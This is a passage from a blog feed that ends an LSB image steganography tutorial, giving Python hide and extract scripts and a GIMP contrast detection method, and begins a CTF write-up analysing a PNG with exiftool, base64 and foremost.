        &lt;span class=&quot;n&quot;&gt;g_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Blue pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;After: (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lsb_spongebob.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What this script does is actually pretty simple. For each color channel of each pixel of the first row, the script extracts the least significant bit and replaces it by the result of the logical operation &lt;strong&gt;&amp;amp;&lt;/strong&gt; between &lt;em&gt;the current least significant bit&lt;/em&gt; and &lt;em&gt;the bit stored at index [i] in bit_array&lt;/em&gt;. Once the message is fully written, remaining pixels on the row are replaced by white pixels(255,255,255).&lt;/p&gt;

&lt;p&gt;I’ve also added some debugging outputs which are useful in order to illustrate the changes that are being made.&lt;/p&gt;

&lt;p&gt;This script only works for hiding short messages in the first row of the picture. It’s not optimized at all so you’ll probably write a better one but you get the idea.&lt;/p&gt;

&lt;h2 id=&quot;detection&quot;&gt;Detection&lt;/h2&gt;

&lt;p&gt;If everything went well, our message is now hidden inside “lsb_spongebob.png”. We will now study one specific method allowing us to detect such steganography techniques. There are many others which have a more mathematical approach but, since it’s not my speciality, I won’t mention them here.&lt;/p&gt;

&lt;h3 id=&quot;all-about-contrast&quot;&gt;All about contrast&lt;/h3&gt;

&lt;p&gt;The technique I’ll present you is very manual. It consists in playing with &lt;strong&gt;brightness&lt;/strong&gt; and &lt;strong&gt;contrast&lt;/strong&gt; parameters in your favorite (GNU) Image Manipulation Program, in order to spot certain irregularities. Nothing better than a concrete example. I personally use GIMP for this purpose.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Let’s open “lsb_spongebob.png” with GIMP and open the &lt;strong&gt;Brightness-Contrast&lt;/strong&gt; box under &lt;strong&gt;Colors&lt;/strong&gt; menu.&lt;/li&gt;
  &lt;li&gt;Set brightness to its minimum value and contrast to its maximum value.&lt;/li&gt;
  &lt;li&gt;Zoom in and scan for irregularities.&lt;/li&gt;
  &lt;li&gt;On the top left, you should see something like that:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/lsb_detection.png&quot; alt=&quot;LSB Detection&quot; title=&quot;LSB Detection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s really suspicious because every pixel should be white in this area.&lt;/p&gt;

&lt;p&gt;This technique is not 100% reliable but pretty straight-forward and simple.&lt;/p&gt;

&lt;p&gt;Once we’ve located the suspected hidden message, we can proceed to the extraction.&lt;/p&gt;

&lt;h2 id=&quot;extraction&quot;&gt;Extraction&lt;/h2&gt;

&lt;p&gt;We’ve detected LSB steganography inside a picture! But how can we recover the message?
Simple! We have to extract the LSBs from each pixel and then assemble the result as a string.&lt;/p&gt;

&lt;p&gt;Once again, I recommand you to write your own script because it’s the only way to make sure everything is clear in your mind. In case you encounter difficulties, you can always take inspiration from mine.&lt;/p&gt;

&lt;h3 id=&quot;python-my-love&quot;&gt;Python my love&lt;/h3&gt;

&lt;p&gt;We know that the secret is hidden in the first row, so it’s useless to iterate over the whole picture with our script.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#coding: utf-8&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Iterate over pixels of the first row&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Store LSB of each color channel of each pixel&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Don't forget that the message was base64-encoded&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;your-turn&quot;&gt;Your Turn!&lt;/h2&gt;

&lt;p&gt;To make this tutorial a bit funnier, I’ve slightly modified &lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;lsb_spongebob.png&lt;/a&gt; and I’ve hidden a different message inside. Will you be able to recover it? :wink:&lt;/p&gt;

&lt;p&gt;Maybe this one isn’t exactly in the same place… :smiling_imp:&lt;/p&gt;

&lt;p&gt;Feel free to send me your result or to post it in the comment section! Good luck!&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/spongebob.png&quot;&gt;original picture (spongebob.png)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;modified picture (lsb_spongebob.png)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/hide_message.py&quot;&gt;hide_message.py&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/unhide_message.py&quot;&gt;unhide_message.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its simplicity and its ability to be undetectable to the naked eye. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.</summary></entry><entry><title type="html">Basic Steganography: Vous n’avez pas les bases - NDH16</title><link href="http://localhost:4000/Basic-Steganography-Vous-navez-pas-les-bases-NDH16.html" rel="alternate" type="text/html" title="Basic Steganography: Vous n'avez pas les bases - NDH16" /><published>2018-07-05T23:30:00+02:00</published><updated>2018-07-05T23:30:00+02:00</updated><id>http://localhost:4000/Basic-Steganography-Vous-navez-pas-les-bases-NDH16</id><content type="html" xml:base="http://localhost:4000/Basic-Steganography-Vous-navez-pas-les-bases-NDH16.html">&lt;p&gt;A steganographic challenge showing the essential tools for PNG analysis and manipulating encoding bases.&lt;/p&gt;

&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#never-gonna-give-you-up&quot; id=&quot;markdown-toc-never-gonna-give-you-up&quot;&gt;Never gonna give you up&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#never-gonna-let-you-down&quot; id=&quot;markdown-toc-never-gonna-let-you-down&quot;&gt;Never gonna let you down&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;The PNG file &lt;a href=&quot;http://localhost:4000/assets/2018-07-05/OREILLES_SALES.png&quot;&gt;OREILLES_SALES.png&lt;/a&gt; (named after the famous french rapper “Orelsan”) is provided without more instructions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-05/OREILLES_SALES.png&quot; alt=&quot;PNG preview&quot; title=&quot;PNG file preview&quot; width=&quot;40%&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;never-gonna-give-you-up&quot;&gt;Never gonna give you up&lt;/h2&gt;

&lt;p&gt;Since we’re never too careful when it comes to steganography, I verified that the provided file was indeed a PNG.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file OREILLES_SALES.png
OREILLES_SALES.png: PNG image data, 680 x 520, 8-bit/color RGBA, non-interlaced
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Even though this check isn’t infallible, we’ll suppose it tells the truth.&lt;/p&gt;

&lt;p&gt;Why don’t we start by checking metadata ? &lt;em&gt;*grabs exiftool*&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool OREILLES_SALES.png
ExifTool Version Number         : 11.03
File Name                       : OREILLES_SALES.png
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 396 kB
File Modification Date/Time     : 2018:07:01 00:11:07+02:00
File Access Date/Time           : 2018:07:05 22:34:23+02:00
File Inode Change Date/Time     : 2018:07:01 00:11:24+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 680
Image Height                    : 520
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Exif Byte Order                 : Little-endian &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Intel, II&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
User Comment                    : aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
Thumbnail Offset                : 154
Thumbnail Length                : 5176
Gamma                           : 2.2222
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Background Color                : 255 255 255
Modify Date                     : 2017:09:22 11:41:16
Datecreate                      : 2017-09-22T13:41:16+02:00
Datemodify                      : 2017-09-22T13:41:16+02:00
Signature                       : f0140da3c2e1bf77c4183d771f341d8f3a8e3afc4c7c3b1b65917e8678b16b3e
Software                        : Adobe ImageReady
Warning                         : &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;minor] Trailer data after PNG IEND chunk
Image Size                      : 680x520
Megapixels                      : 0.354
Thumbnail Image                 : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Binary data 5176 bytes, use &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; option to extract&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;User Comment&lt;/strong&gt; caught my attention, it was at this moment that I severely underestimated this challenge…&lt;/p&gt;

&lt;p&gt;Decoding this base64-encoded comment gives us the following URL:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
https://www.youtube.com/watch?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dQw4w9WgXcQ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I let you visit this link… Don’t worry, nothing dangerous. :sob:&lt;/p&gt;

&lt;h2 id=&quot;never-gonna-let-you-down&quot;&gt;Never gonna let you down&lt;/h2&gt;

&lt;p&gt;After this bitter failure, I decided to change my approach and to start looking for any dissimulated file inside the picture. To complete this task, I recommend the “&lt;strong&gt;Foremost&lt;/strong&gt;” tool, which is one of the best in its category.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;foremost OREILLES_SALES.png
Processing: OREILLES_SALES.png
|&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;|
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The result of the extraction is stored in the “output” folder by default. Here, it gives two PNG files:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;output/png/
00000000.png  00000370.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;00000000.png&lt;/strong&gt; is the original picture provided with the challenge, but &lt;a href=&quot;http://localhost:4000/assets/2018-07-05/00000370.png&quot;&gt;00000370.png&lt;/a&gt; is way more interesting:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-05/00000370.png&quot; alt=&quot;00000370.png&quot; title=&quot;00000370.png preview&quot; width=&quot;40%&quot; /&gt;&lt;/p&gt;

